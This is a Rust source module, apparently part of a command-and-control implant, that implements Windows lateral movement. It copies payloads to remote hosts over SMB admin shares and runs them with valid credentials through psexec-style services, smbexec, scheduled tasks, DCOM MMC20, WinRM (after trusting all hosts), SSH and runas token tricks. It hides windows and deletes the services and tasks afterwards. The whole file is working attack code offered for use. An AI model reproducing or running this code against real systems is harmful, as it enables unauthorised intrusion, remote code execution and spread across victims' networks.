/// Lateral movement methods for Windows targets.
/// All methods are Windows-only; non-Windows stubs return Err immediately.

#[cfg(target_os = "windows")]
mod inner {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::process::Command;
    use std::fs;
    use windows_sys::Win32::System::Services::{
        OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService, CloseServiceHandle,
        SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    };
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
    use windows_sys::Win32::Security::{
        ImpersonateLoggedOnUser, LogonUserW, RevertToSelf,
        LOGON32_LOGON_BATCH, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, OpenProcessToken, STARTUPINFOW, PROCESS_INFORMATION,
    };

    #[repr(C)]
    struct NativeSystemTime {
        year: u16, month: u16, day_of_week: u16, day: u16,
        hour: u16, minute: u16, second: u16, milliseconds: u16,
    }

    #[link(name = "advapi32")]
    extern "system" {
        fn OpenThreadToken(thread: isize, desired_access: u32, open_as_self: i32,
                           token: *mut isize) -> i32;
        fn SetThreadToken(thread: *const isize, token: isize) -> i32;
        fn CreateProcessWithLogonW(
            username: *const u16, domain: *const u16, password: *const u16,
            logon_flags: u32, application: *const u16, command: *mut u16,
            creation_flags: u32, environment: *const core::ffi::c_void,
            current_dir: *const u16, startup: *const STARTUPINFOW,
            process_info: *mut PROCESS_INFORMATION,
        ) -> i32;
        fn CreateProcessAsUserW(
            token: isize, application: *const u16, command: *mut u16,
            process_attrs: *const core::ffi::c_void,
            thread_attrs: *const core::ffi::c_void,
            inherit_handles: i32, creation_flags: u32,
            environment: *const core::ffi::c_void, current_dir: *const u16,
            startup: *const STARTUPINFOW, process_info: *mut PROCESS_INFORMATION,
        ) -> i32;
        fn CreateProcessWithTokenW(
            token: isize, logon_flags: u32, application: *const u16,
            command: *mut u16, creation_flags: u32,
            environment: *const core::ffi::c_void, current_dir: *const u16,
            startup: *const STARTUPINFOW, process_info: *mut PROCESS_INFORMATION,
        ) -> i32;
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetCurrentThread() -> isize;
        fn GetLocalTime(system_time: *mut NativeSystemTime);
        fn GetExitCodeProcess(process: isize, exit_code: *mut u32) -> i32;
        fn WaitForSingleObject(handle: isize, milliseconds: u32) -> u32;
    }

    const TOKEN_IMPERSONATE_ACCESS: u32 = 0x0004;
    const WAIT_OBJECT_0: u32 = 0;

    unsafe fn restore_thread_identity(
        impersonated: bool,
        had_previous_token: bool,
        previous_token: isize,
    ) -> u32 {
        if !impersonated {
            return 0;
        }
        if had_previous_token {
            if SetThreadToken(std::ptr::null(), previous_token) != 0 {
                return 0;
            }
            let err = GetLastError();
            RevertToSelf();
            err
        } else if RevertToSelf() != 0 {
            0
        } else {
            GetLastError()
        }
    }

    fn to_wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    fn rand_svc_name() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos();
        format!("svc{:08x}", t)
    }

    fn shell(cmd: &str) -> String {
        crate::commands::shell(cmd)
    }

    /// Stage payload bytes to \\host\ADMIN$ or \\host\C$\Windows\Temp.
    /// Returns the remote local path (e.g. C:\Windows\name.exe) or Err.
    fn smb_stage(host: &str, name: &str, user: &str, pass: &str, data: &[u8]) -> Result<String, String> {
        // Drop any existing implicit (machine-account) session to this host so we can
        // authenticate with explicit user credentials.  Error 3775 occurs when the
        // token already has a cached session and a /user: override is rejected.
        shell(&format!("net use \\\\{} /delete /y 2>nul", host));
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
        }

        let unc1 = format!("\\\\{}\\ADMIN$\\{}", host, name);
        if fs::write(&unc1, data).is_ok() {
            if !user.is_empty() {
                shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
            }
            return Ok(format!("C:\\Windows\\{}", name));
        }

        let unc2 = format!("\\\\{}\\C$\\Windows\\Temp\\{}", host, name);
        if fs::write(&unc2, data).is_ok() {
            if !user.is_empty() {
                shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
            }
            return Ok(format!("C:\\Windows\\Temp\\{}", name));
        }

        let unc3 = format!("\\\\{}\\C$\\Users\\Public\\{}", host, name);
        if fs::write(&unc3, data).is_ok() {
            if !user.is_empty() {
                shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
            }
            return Ok(format!("C:\\Users\\Public\\{}", name));
        }

        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
        }
        Err("SMB staging failed (ADMIN$, C$\\Windows\\Temp, and C$\\Users\\Public all inaccessible)".to_string())
    }

    /// Open remote SCM, create + start a service, then delete the service entry.
    /// `bin_path` is either the EXE path (psexec) or a cmd.exe wrapper (smbexec).
    unsafe fn scm_exec(host: &str, svc_name: &str, bin_path: &str) -> Result<(), String> {
        let machine = to_wide(&format!("\\\\{}", host));
        let scm = OpenSCManagerW(machine.as_ptr(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if scm == 0 {
            return Err(format!("OpenSCManager failed: {}", GetLastError()));
        }

        let wsvc = to_wide(svc_name);
        let wbin = to_wide(bin_path);
        let svc = CreateServiceW(
            scm,
            wsvc.as_ptr(),
            wsvc.as_ptr(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            wbin.as_ptr(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );
        if svc == 0 {
            CloseServiceHandle(scm);
            return Err(format!("CreateService failed: {}", GetLastError()));
        }

        StartServiceW(svc, 0, std::ptr::null());
        DeleteService(svc);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        Ok(())
    }

    pub fn lateral_psexec(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        unsafe { scm_exec(host, &svc_name, &remote_path)?; }
        Ok(format!(
            "[+] psexec → {}\n    svc : {}\n    path: {}",
            host, svc_name, remote_path
        ))
    }

    pub fn lateral_wmi(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        // Use schtasks with explicit domain-user credentials so the child process
        // runs as the provided account (not SYSTEM/machine-account), enabling
        // cross-domain named-pipe auth back to the parent.
        let st = current_time_plus_minutes(2);
        let (auth_args, ru_args) = if !user.is_empty() {
            (
                format!(" /U \"{}\" /P \"{}\"", user, pass),
                format!(" /RU \"{}\" /RP \"{}\"", user, pass),
            )
        } else {
            (String::new(), " /RU SYSTEM".to_string())
        };
        let create_out = shell(&format!(
            "schtasks /Create /S \"{}\"{}{}  /SC ONCE /ST {} /F /TN \"{}\" /TR \"{}\" 2>&1",
            host, auth_args, ru_args, st, svc_name, remote_path
        ));
        let run_out = shell(&format!(
            "schtasks /Run /S \"{}\"{}  /TN \"{}\" 2>&1",
            host, auth_args, svc_name
        ));
        let _ = shell(&format!(
            "schtasks /Delete /S \"{}\"{}  /TN \"{}\" /F 2>&1",
            host, auth_args, svc_name
        ));
        Ok(format!(
            "[+] wmi → {}\n    path: {}\n{}\n{}",
            host,
            remote_path,
            create_out.trim(),
            run_out.trim()
        ))
    }

    pub fn lateral_smbexec(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let bin_path = format!(
            "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"{}\"",
            remote_path
        );
        unsafe { scm_exec(host, &svc_name, &bin_path)?; }
        Ok(format!(
            "[+] smbexec → {}\n    svc: {}\n    chain: SERVICES.EXE→cmd.exe→agent",
            host, svc_name
        ))
    }

    pub fn lateral_dcom(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let safe_path = remote_path.replace('"', "\\\"");
        let ps_inner = format!(
            "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{}'));\
             $c.Document.ActiveView.ExecuteShellCommand('{}',$null,'','7')",
            host, safe_path
        );
        let cmd = format!(
            "powershell -NoP -W Hidden -Exec Bypass -C \"{}\"",
            ps_inner.replace('"', "\\\"")
        );
        let out = shell(&cmd);
        Ok(format!(
            "[+] dcom → {}\n    path: {}\n{}",
            host,
            remote_path,
            out.trim()
        ))
    }

    pub fn lateral_winrm(host: &str, data: &[u8], user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();
        let exe_name = format!("{}.exe", svc_name);
        let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
        let trust_prefix = format!(
            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
             try{{$ip=[System.Net.Dns]::GetHostAddresses('{}')[0].IPAddressToString}}\
             catch{{$ip='{}'}};",
            host, host
        );
        let ps_inner = if !user.is_empty() {
            format!(
                "{}$c=New-Object PSCredential('{}', (ConvertTo-SecureString '{}' -AsPlainText -Force));\
                 Invoke-Command -ComputerName $ip -Credential $c -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
                trust_prefix, user, pass, remote_path
            )
        } else {
            format!(
                "{}Invoke-Command -ComputerName $ip -ScriptBlock {{Start-Process '{}' -WindowStyle Hidden}}",
                trust_prefix, remote_path
            )
        };
        let cmd = format!(
            "powershell -NoP -W Hidden -Exec Bypass -C \"{}\"",
            ps_inner.replace('"', "\\\"")
        );
        let out = shell(&cmd);
        Ok(format!(
            "[+] winrm → {}\n    path: {}\n{}",
            host,
            remote_path,
            out.trim()
        ))
    }

    unsafe fn spawn_as_user_direct(path: &str, account: &str, password: &str)
        -> Result<(u32, String), String>
    {
        // Credential-backed RunAs. The primary child is created immediately;
        // token APIs are compatibility fallbacks for machines where Secondary
        // Logon or local policy blocks CreateProcessWithLogonW.
        let (domain, username) = if let Some(i) = account.find('\\') {
            (account[..i].to_string(), account[i + 1..].to_string())
        } else if let Some(i) = account.find('@') {
            (account[i + 1..].to_string(), account[..i].to_string())
        } else {
            (".".to_string(), account.to_string())
        };
        if username.is_empty() || password.is_empty() {
            return Err("invalid username or password".to_string());
        }

        let wuser = to_wide(&username);
        let wdomain = to_wide(&domain);
        let wpass = to_wide(password);
        let wpath = to_wide(path);
        let wcwd = to_wide(r"C:\Windows\System32");
        let mut wcmd = to_wide(&format!(r#""{}""#, path));
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = 0x0000_0001; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0; // SW_HIDE
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let logon_ok = CreateProcessWithLogonW(
            wuser.as_ptr(), wdomain.as_ptr(), wpass.as_ptr(), 0,
            wpath.as_ptr(), wcmd.as_mut_ptr(), 0x0800_0000,
            std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
        );
        let logon_err = if logon_ok == 0 { GetLastError() } else { 0 };
        if logon_ok != 0 {
            let pid = pi.dwProcessId;
            let wait = WaitForSingleObject(pi.hProcess, 1000);
            if wait == WAIT_OBJECT_0 {
                let mut exit_code = 0u32;
                GetExitCodeProcess(pi.hProcess, &mut exit_code);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return Err(format!(
                    "runas child exited immediately (method=CreateProcessWithLogonW, exit=0x{:08x})",
                    exit_code
                ));
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return Ok((pid, "CreateProcessWithLogonW".to_string()));
        }

        // Ensure the fallback is executed with the same SYSTEM context that
        // backs the post-getsystem shell when one is available.
        let system_token = crate::commands::system_token_handle();
        let mut previous_token = 0isize;
        let had_previous_token = OpenThreadToken(
            GetCurrentThread(),
            TOKEN_IMPERSONATE_ACCESS | TOKEN_QUERY,
            0,
            &mut previous_token,
        ) != 0;
        let mut impersonated = false;
        if system_token != 0 && ImpersonateLoggedOnUser(system_token) != 0 {
            impersonated = true;
            crate::commands::enable_priv_token(system_token, "SeImpersonatePrivilege");
            crate::commands::enable_priv_token(system_token, "SeIncreaseQuotaPrivilege");
            crate::commands::enable_priv_token(system_token, "SeAssignPrimaryTokenPrivilege");
        }
        let mut self_token = 0isize;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut self_token) != 0 {
            crate::commands::enable_priv(self_token, "SeImpersonatePrivilege");
            crate::commands::enable_priv(self_token, "SeIncreaseQuotaPrivilege");
            crate::commands::enable_priv(self_token, "SeAssignPrimaryTokenPrivilege");
            CloseHandle(self_token);
        }

        let domain_ptr = wdomain.as_ptr();
        let mut user_token = 0isize;
        let mut logged = LogonUserW(
            wuser.as_ptr(), domain_ptr, wpass.as_ptr(),
            LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &mut user_token,
        );
        let mut batch_err = 0;
        let mut interactive_err = 0;
        if logged == 0 {
            batch_err = GetLastError();
            logged = LogonUserW(
                wuser.as_ptr(), domain_ptr, wpass.as_ptr(),
                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &mut user_token,
            );
            if logged == 0 { interactive_err = GetLastError(); }
        }

        let mut created = 0;
        let mut method = String::new();
        let mut as_user_err = 0;
        let mut with_token_err = 0;
        if logged != 0 {
            let mut cmd_as_user = to_wide(&format!(r#""{}""#, path));
            created = CreateProcessAsUserW(
                user_token, wpath.as_ptr(), cmd_as_user.as_mut_ptr(),
                std::ptr::null(), std::ptr::null(), 0, 0x0800_0000,
                std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
            );
            if created != 0 {
                method = "CreateProcessAsUserW".to_string();
            } else {
                as_user_err = GetLastError();
            }
            if created == 0 {
                let mut cmd_with_token = to_wide(&format!(r#""{}""#, path));
                created = CreateProcessWithTokenW(
                    user_token, 0, wpath.as_ptr(), cmd_with_token.as_mut_ptr(),
                    0x0800_0000, std::ptr::null(), wcwd.as_ptr(), &si, &mut pi,
                );
                if created != 0 {
                    method = "CreateProcessWithTokenW".to_string();
                } else {
                    with_token_err = GetLastError();
                }
            }
        }

        if created != 0 {
            let pid = pi.dwProcessId;
            let wait = WaitForSingleObject(pi.hProcess, 1000);
            if wait == WAIT_OBJECT_0 {
                let mut exit_code = 0u32;
                GetExitCodeProcess(pi.hProcess, &mut exit_code);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(user_token);
                let restore_err = restore_thread_identity(
                    impersonated, had_previous_token, previous_token,
                );
                if had_previous_token { CloseHandle(previous_token); }
                if restore_err != 0 {
                    return Err(format!(
                        "runas child exited immediately (method={}, exit=0x{:08x}); thread token restore failed={}",
                        method, exit_code, restore_err
                    ));
                }
                return Err(format!(
                    "runas child exited immediately (method={}, exit=0x{:08x})",
                    method, exit_code
                ));
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(user_token);
            let restore_err = restore_thread_identity(
                impersonated, had_previous_token, previous_token,
            );
            if had_previous_token { CloseHandle(previous_token); }
            if restore_err != 0 {
                method.push_str(&format!(" (thread token restore failed={})", restore_err));
            }
            return Ok((pid, method));
        }

        if user_token != 0 { CloseHandle(user_token); }
        let restore_err = restore_thread_identity(
            impersonated, had_previous_token, previous_token,
        );
        if had_previous_token { CloseHandle(previous_token); }
        if restore_err != 0 {
            return Err(format!(
                "CreateProcessWithLogonW={} batch={} interactive={} AsUser={} WithToken={}; thread token restore failed={}",
                logon_err, batch_err, interactive_err, as_user_err, with_token_err, restore_err,
            ));
        }
        Err(format!(
            "CreateProcessWithLogonW={} batch={} interactive={} AsUser={} WithToken={}",
            logon_err, batch_err, interactive_err, as_user_err, with_token_err,
        ))
    }

    fn current_time_plus_minutes(add_minutes: u64) -> String {
        let mut st = NativeSystemTime {
            year: 0, month: 0, day_of_week: 0, day: 0,
            hour: 0, minute: 0, second: 0, milliseconds: 0,
        };
        unsafe { GetLocalTime(&mut st); }
        let total_mins = (st.hour as u64 * 60 + st.minute as u64 + add_minutes) % (24 * 60);
        format!("{:02}:{:02}", total_mins / 60, total_mins % 60)
    }

    pub fn lateral_atexec(host: &str, data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
        // Stage payload to remote host first when we have bytes; otherwise cmd_path
        // must already exist on the remote machine.
        let staged: String;
        let effective_path: &str = if !data.is_empty() {
            let exe_name = format!("{}.exe", rand_svc_name());
            staged = smb_stage(host, &exe_name, user, pass, data)?;
            &staged
        } else {
            cmd_path
        };

        let svc_name = rand_svc_name();
        // Establish authenticated IPC$ session first so /S without /U /P works.
        // Windows rejects /U /P when the target resolves to the local machine.
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
        }
        // schtasks targeting always via /S only (no explicit creds — rely on IPC$ session).
        let sch = |sub: &str| -> String {
            shell(&format!("schtasks {} /S \"{}\"", sub, host))
        };
        // Task name without leading \ to avoid syntax errors on older Windows builds.
        let task_name = svc_name.clone();
        // Schedule for current local time + 2 minutes so the task is not in the past.
        let st = current_time_plus_minutes(2);
        sch(&format!(
            "/Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST {} /RU SYSTEM /F",
            task_name, effective_path, st
        ));
        let out = sch(&format!("/Run /TN \"{}\"", task_name));
        std::thread::sleep(std::time::Duration::from_secs(3));
        sch(&format!("/Delete /TN \"{}\" /F", task_name));
        if !user.is_empty() {
            shell(&format!("net use \\\\{}\\IPC$ /delete /y 2>nul", host));
        }
        Ok(format!(
            "[+] atexec → {}\n    task: {}\n    path: {}\n    runas: SYSTEM\n    sched: {}\n{}",
            host,
            task_name,
            effective_path,
            st,
            out.trim()
        ))
    }

    pub fn lateral_ssh(host: &str, data: &[u8], user: &str, _pass: &str) -> Result<String, String> {
        use std::time::{SystemTime, UNIX_EPOCH};
        let ts = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let exe_name = format!("agent_{}.elf", ts);
        let remote_path = format!("/tmp/{}", exe_name);

        let tmp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
        let tmp_path = format!("{}\\{}", tmp_dir, exe_name);
        std::fs::write(&tmp_path, data).map_err(|e| format!("ssh: write temp: {}", e))?;

        let (ssh_host, port) = if let Some(i) = host.rfind(':') {
            (&host[..i], &host[i + 1..])
        } else {
            (host, "22")
        };

        let opts = "-o StrictHostKeyChecking=no -o BatchMode=yes";
        let scp_cmd = format!(
            "scp -P {} {} \"{}\" {}@{}:{} 2>&1",
            port, opts, tmp_path, user, ssh_host, remote_path
        );
        let ssh_cmd = format!(
            "ssh -p {} {} {}@{} \"chmod +x {} && nohup {} </dev/null >/dev/null 2>&1 &\" 2>&1",
            port, opts, user, ssh_host, remote_path, remote_path
        );
        let scp_out = shell(&scp_cmd);
        let ssh_out = shell(&ssh_cmd);
        let _ = std::fs::remove_file(&tmp_path);
        Ok(format!(
            "[+] ssh → {}\n    path: {}\nscp: {}\nssh: {}",
            host,
            remote_path,
            scp_out.trim(),
            ssh_out.trim()
        ))
    }

    pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
        let svc_name = rand_svc_name();

        // Stage under a unique name so a self-spawn never overwrites the
        // executable that is currently running.
        let exe_name = format!("{}.exe", svc_name);
        let mut effective_path = String::new();
        let mut stage_errors: Vec<String> = Vec::new();
        for directory in [r"C:\Users\Public", r"C:\Windows\Temp", r"C:\Windows"] {
            let candidate = format!(r"{}\{}", directory, exe_name);
            let staged = if !data.is_empty() {
                fs::write(&candidate, data).map(|_| ())
            } else {
                fs::copy(cmd_path, &candidate).map(|_| ())
            };
            match staged {
                Ok(()) if std::path::Path::new(&candidate).exists() => {
                    effective_path = candidate;
                    break;
                }
                Ok(()) => stage_errors.push(format!("{}: file not found after staging", directory)),
                Err(err) => stage_errors.push(format!("{}: {}", directory, err)),
            }
        }
        if effective_path.is_empty() {
            return Err(format!(
                "runas: staged payload is not readable ({})",
                stage_errors.join("; ")
            ));
        }

        // Token impersonation is thread-local on Windows. Keep the beacon
        // thread out of the credential launch so a failed fallback cannot
        // alter the identity used by the next beacon or result submission.
        let launch_path = effective_path.clone();
        let launch_user = user.to_string();
        let launch_pass = pass.to_string();
        let direct_result = match std::thread::Builder::new()
            .name("runas-launch".to_string())
            .spawn(move || unsafe {
                spawn_as_user_direct(&launch_path, &launch_user, &launch_pass)
            })
        {
            Ok(thread) => thread
                .join()
                .map_err(|_| "runas: launch thread terminated unexpectedly".to_string())
                .and_then(|result| result),
            Err(err) => Err(format!("runas: launch thread creation failed: {}", err)),
        };
        let direct_err = match direct_result {
            Ok((pid, method)) => {
                return Ok(format!(
                    "[+] runas → {}\n    path: {}\n    pid: {}\n    method: {}",
                    user, effective_path, pid, method
                ));
            }
            Err(err) => err,
        };

        // Strip leading ".\" from user for schtasks /RU (schtasks rejects "." as domain).
        let ru_account = if let Some(idx) = user.find('\\') {
            let domain = &user[..idx];
            let uname  = &user[idx + 1..];
            if domain == "." { uname.to_string() } else { user.to_string() }
        } else {
            user.to_string()
        };

        let task_name = svc_name.clone();

        // schtasks /RU+/RP creates a batch-logon session (type 4) — unlike PSRemoting
        // (type 3), the child process can authenticate outbound to named pipes.
        let start_at = current_time_plus_minutes(2);
        let create_out = Command::new("schtasks")
            .args([
                "/create",
                "/RU", &ru_account, "/RP", pass,
                "/TR", effective_path.as_str(),
                "/TN", &task_name,
                "/SC", "ONCE", "/ST", &start_at, "/RL", "HIGHEST",
                "/F",
            ])
            .output()
            .map_err(|e| format!("runas: schtasks /create: {}", e))?;

        if !create_out.status.success() {
            return Err(format!(
                "runas: direct launch failed: {}\nrunas: schtasks /create failed: {}{}",
                direct_err,
                String::from_utf8_lossy(&create_out.stdout),
                String::from_utf8_lossy(&create_out.stderr),
            ));
        }

        let run_out = Command::new("schtasks")
            .args(["/run", "/TN", &task_name])
            .output()
            .map_err(|e| format!("runas: schtasks /run: {}", e))?;
        if !run_out.status.success() {
            let _ = Command::new("schtasks")
                .args(["/delete", "/TN", &task_name, "/F"])
                .output();
            return Err(format!(
                "runas: direct launch failed: {}\nrunas: schtasks /run failed: {}{}",
                direct_err,
                String::from_utf8_lossy(&run_out.stdout),
                String::from_utf8_lossy(&run_out.stderr),
            ));
        }

        let tn = task_name.clone();
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(4));
            let _ = Command::new("schtasks")
                .args(["/delete", "/TN", &tn, "/F"])
                .output();
        });

        Ok(format!(
            "[+] runas → {} (schtasks fallback /ST {})\n    path: {}\n    direct launch failed: {}\n",
            user, start_at, effective_path, direct_err
        ))
    }

    pub fn run_lateral(
        method: &str,
        host: &str,
        data: &[u8],
        cmd: &str,
        user: &str,
        pass: &str,
    ) -> Result<String, String> {
        match method {
            "psexec" => lateral_psexec(host, data, user, pass),
            "wmi" => lateral_wmi(host, data, user, pass),
            "smbexec" | "smb" => lateral_smbexec(host, data, user, pass),
            "dcom" => lateral_dcom(host, data, user, pass),
            "winrm" => lateral_winrm(host, data, user, pass),
            "ssh" => lateral_ssh(host, data, user, pass),
            "atexec" | "at" => lateral_atexec(host, data, cmd, user, pass),
            "runas" => lateral_runas(data, cmd, user, pass),
            _ => Err(format!(
                "unknown method: {} — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas",
                method
            )),
        }
    }
}

pub fn run_lateral(
    method: &str,
    host: &str,
    data: &[u8],
    cmd: &str,
    user: &str,
    pass: &str,
) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        inner::run_lateral(method, host, data, cmd, user, pass)
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (method, host, data, cmd, user, pass);
        Err("LATERAL: not supported on Linux".to_string())
    }
}
